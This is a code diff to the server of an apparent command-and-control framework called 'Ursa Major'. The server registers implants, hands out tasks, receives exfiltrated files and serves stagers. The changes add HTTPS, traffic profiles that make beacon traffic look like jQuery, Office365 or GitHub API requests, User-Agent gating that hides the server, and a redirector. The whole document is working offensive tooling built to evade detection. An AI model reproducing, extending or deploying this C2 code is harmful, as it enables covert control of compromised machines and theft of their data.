@@ -1,10 +1,10 @@
 #!/usr/bin/env python3
 """
-Ursa Major — C2 HTTP Server
-==============================
+Ursa Major — C2 HTTP/HTTPS Server
+====================================
 The always-running daemon that implants beacon back to.
 
-Endpoints:
+Default endpoints (can be remapped by traffic profiles):
     POST /register     — New implant registers, gets session ID + key
     POST /beacon       — Implant checks in, gets pending tasks
     POST /result       — Implant returns task results
@@ -12,11 +12,16 @@ Endpoints:
     GET  /download/<id> — Implant downloads a file (delivery)
     GET  /stage        — Serve a stager payload
 
+Advanced features (Phase 6):
+    - TLS/HTTPS: set major.tls.enabled=true in ursa.yaml
+    - Traffic profiles: set major.traffic_profile=jquery|office365|github-api
+    - HTTP redirector: set major.redirector.enabled=true
+
 All comms are encrypted with per-session AES keys after registration.
 HTTP looks like normal web traffic (JSON API responses).
 
 Run:
-    python3 major/server.py [--port 8443] [--host 0.0.0.0]
+    python3 major/server.py [--port 8443] [--host 0.0.0.0] [--tls] [--profile jquery]
 """
 
 import argparse
@@ -34,8 +39,11 @@ from urllib.parse import urlparse
 sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))
 
 from implants.builder import Builder as _PayloadBuilder
+from major.cert import build_ssl_context, ensure_cert
 from major.config import get_config, reload_config
 from major.crypto import UrsaCrypto, generate_session_key
+from major.profiles import TrafficProfile, get_profile
+from major.redirector import redirector_from_config
 from major.db import (
     complete_task,
     create_session,
@@ -60,6 +68,9 @@ STALE_THRESHOLD = _cfg.get("major.stale_threshold", 300)
 SERVER_HEADER = _cfg.get("major.server_header", "nginx/1.24.0")
 REAPER_INTERVAL = _cfg.get("major.reaper_interval", 30)
 
+# Active traffic profile — controls URL routing and response headers
+_profile: TrafficProfile = get_profile(_cfg.get("major.traffic_profile", "default"))
+
 
 class UrsaC2Handler(BaseHTTPRequestHandler):
     """HTTP request handler for C2 communications."""
@@ -69,14 +80,16 @@ class UrsaC2Handler(BaseHTTPRequestHandler):
         pass
 
     def _send_json(self, data, status=200):
-        """Send a JSON response."""
+        """Send a JSON response with active profile headers."""
         body = json.dumps(data).encode()
         self.send_response(status)
         self.send_header("Content-Type", "application/json")
         self.send_header("Content-Length", str(len(body)))
-        # Disguise as a generic web API
-        self.send_header("Server", SERVER_HEADER)
+        # Server header and extra headers from active traffic profile
+        self.send_header("Server", _profile.server_header)
         self.send_header("X-Request-Id", os.urandom(8).hex())
+        for key, val in _profile.response_headers.items():
+            self.send_header(key, val)
         self.end_headers()
         self.wfile.write(body)
 
@@ -102,40 +115,62 @@ class UrsaC2Handler(BaseHTTPRequestHandler):
 
     def do_GET(self):
         path = urlparse(self.path).path
+        rev = _profile.reverse_map()
+        dl_prefix = _profile.download_prefix()
 
+        # Check User-Agent filter if profile requires it
+        if _profile.user_agent_filter:
+            ua = self.headers.get("User-Agent", "")
+            if _profile.user_agent_filter not in ua:
+                self._send_json({"error": "not found"}, 404)
+                return
+
+        # Root decoy
         if path == "/":
-            # Decoy — looks like a normal website
             self._send_json({
                 "status": "ok",
                 "version": "1.0",
                 "timestamp": datetime.now(UTC).isoformat()
             })
 
-        elif path.startswith("/download/"):
-            file_id = path.split("/")[-1]
-            self._handle_download(file_id)
-
-        elif path == "/stage":
-            self._handle_stage()
-
+        # Health check (always on fixed path for monitoring)
         elif path == "/health":
             self._send_json({"status": "healthy"})
 
+        # Download: match profile download prefix
+        elif path.startswith(dl_prefix + "/"):
+            file_id = path[len(dl_prefix):].lstrip("/")
+            self._handle_download(file_id)
+
+        # Stage: profile-mapped path
+        elif path == rev.get("stage", "/stage"):
+            self._handle_stage()
+
         else:
-            # Return 404 for unknown paths (like a real server)
+            # Return 404 for unknown paths
             self._send_json({"error": "not found"}, 404)
 
     def do_POST(self):
         path = urlparse(self.path).path
         body = self._read_body()
+        rev = _profile.reverse_map()
 
-        if path == "/register":
+        # Check User-Agent filter if profile requires it
+        if _profile.user_agent_filter:
+            ua = self.headers.get("User-Agent", "")
+            if _profile.user_agent_filter not in ua:
+                self._send_json({"error": "not found"}, 404)
+                return
+
+        logical = rev.get(path)
+
+        if logical == "register":
             self._handle_register(body)
-        elif path == "/beacon":
+        elif logical == "beacon":
             self._handle_beacon(body)
-        elif path == "/result":
+        elif logical == "result":
             self._handle_result(body)
-        elif path == "/upload":
+        elif logical == "upload":
             self._handle_upload(body)
         else:
             self._send_json({"error": "not found"}, 404)
@@ -372,58 +407,124 @@ def _log(msg):
 # ── Main ──
 
 
-def start_server(host=DEFAULT_HOST, port=DEFAULT_PORT):
-    """Start the Ursa Major C2 server."""
+def start_server(
+    host=DEFAULT_HOST,
+    port=DEFAULT_PORT,
+    tls: bool = False,
+    cert_path: str | None = None,
+    key_path: str | None = None,
+    profile_name: str | None = None,
+):
+    """Start the Ursa Major C2 server.
+
+    Args:
+        host: Bind address.
+        port: Bind port.
+        tls: Enable HTTPS (self-signed cert auto-generated if cert_path not set).
+        cert_path: Path to TLS certificate PEM (optional, auto-generated if None).
+        key_path: Path to TLS private key PEM (optional, auto-generated if None).
+        profile_name: Traffic profile name (overrides ursa.yaml setting).
+    """
+    global _profile
+
     init_db()
+
+    # Activate traffic profile
+    if profile_name:
+        _profile = get_profile(profile_name)
+    cfg = get_config()
+    if not profile_name:
+        _profile = get_profile(cfg.get("major.traffic_profile", "default"))
 
     # Start reaper thread
     reaper = threading.Thread(target=_session_reaper, daemon=True)
     reaper.start()
 
+    # Start redirector (if configured)
+    redirector = redirector_from_config(cfg)
+    if redirector:
+        redirector.start()
+
     server = HTTPServer((host, port), UrsaC2Handler)
 
-    _log("=" * 55)
+    # ── TLS wrapping ──────────────────────────────────────────────────────────
+    use_tls = tls or cfg.get("major.tls.enabled", False)
+    if use_tls:
+        if not cert_path or not key_path:
+            _cert, _key = ensure_cert(
+                hostname=cfg.get("major.tls.hostname", ""),
+                extra_sans=cfg.get("major.tls.extra_sans", []),
+                days=cfg.get("major.tls.cert_days", 365),
+            )
+            cert_path = str(_cert)
+            key_path  = str(_key)
+        ctx = build_ssl_context(cert_path, key_path)
+        server.socket = ctx.wrap_socket(server.socket, server_side=True)
+
+    protocol = "HTTPS" if use_tls else "HTTP"
+    scheme   = "https" if use_tls else "http"
+
+    # ── Startup banner ────────────────────────────────────────────────────────
+    _log("=" * 58)
     _log("  URSA MAJOR — Command & Control Server")
-    _log("=" * 55)
+    _log("=" * 58)
     _log(f"  Listening: {host}:{port}")
-    _log("  Protocol:  HTTP")
+    _log(f"  Protocol:  {protocol}")
+    _log(f"  Profile:   {_profile.name} — {_profile.description}")
     _log(f"  Database:  {os.path.abspath(os.path.join(os.path.dirname(__file__), 'ursa.db'))}")
+    if redirector:
+        _log(f"  Redirector: :{redirector.config.listen_port} → {scheme}://{host}:{port}")
     _log("")
     _log("  Endpoints:")
-    _log("    POST /register  — Implant registration")
-    _log("    POST /beacon    — Implant check-in")
-    _log("    POST /result    — Task results")
-    _log("    POST /upload    — File exfiltration")
-    _log("    GET  /download  — File delivery")
-    _log("    GET  /stage     — Serve stager")
-    _log("=" * 55)
+    rev = _profile.reverse_map()
+    dl_prefix = _profile.download_prefix()
+    for logical, path in _profile.urls.items():
+        _log(f"    {logical:10s} → {path}")
+    _log("=" * 58)
     _log("  Waiting for connections...")
     _log("")
 
-    log_event("info", "server", f"Ursa Major C2 started on {host}:{port}")
+    log_event("info", "server", f"Ursa Major C2 started on {host}:{port} ({protocol}, profile={_profile.name})")
 
     try:
         server.serve_forever()
     except KeyboardInterrupt:
         _log("\n[*] Shutting down...")
         server.shutdown()
+        if redirector:
+            redirector.stop()
         log_event("info", "server", "Ursa Major C2 stopped")
 
 
 if __name__ == "__main__":
     parser = argparse.ArgumentParser(description="Ursa Major C2 Server")
-    parser.add_argument("--host", default=None, help="Bind address")
-    parser.add_argument("--port", type=int, default=None, help="Bind port")
-    parser.add_argument("--profile", default=None, help="Config profile to use")
-    parser.add_argument("--config", default=None, help="Path to config file")
+    parser.add_argument("--host",    default=None, help="Bind address")
+    parser.add_argument("--port",    type=int, default=None, help="Bind port")
+    parser.add_argument("--config",  default=None, help="Path to ursa.yaml")
+    parser.add_argument("--cfg-profile", default=None, dest="cfg_profile",
+                        help="ursa.yaml config profile to activate")
+    parser.add_argument("--tls",     action="store_true", default=False,
+                        help="Enable HTTPS (auto-generates self-signed cert)")
+    parser.add_argument("--cert",    default=None, help="TLS certificate PEM path")
+    parser.add_argument("--key",     default=None, help="TLS private key PEM path")
+    parser.add_argument("--traffic-profile", default=None, dest="traffic_profile",
+                        help="Traffic profile (default|jquery|office365|github-api)")
     args = parser.parse_args()
 
-    # Reload config with profile/path if specified
-    if args.profile or args.config:
-        cfg = reload_config(path=args.config, profile=args.profile)
+    # Reload config with yaml-profile/path if specified
+    if args.cfg_profile or args.config:
+        cfg = reload_config(path=args.config, profile=args.cfg_profile)
     else:
         cfg = get_config()
 
     host = args.host or cfg.get("major.host", DEFAULT_HOST)
     port = args.port or cfg.get("major.port", DEFAULT_PORT)
-    start_server(host, port)
+
+    start_server(
+        host=host,
+        port=port,
+        tls=args.tls,
+        cert_path=args.cert,
+        key_path=args.key,
+        profile_name=args.traffic_profile,
+    )
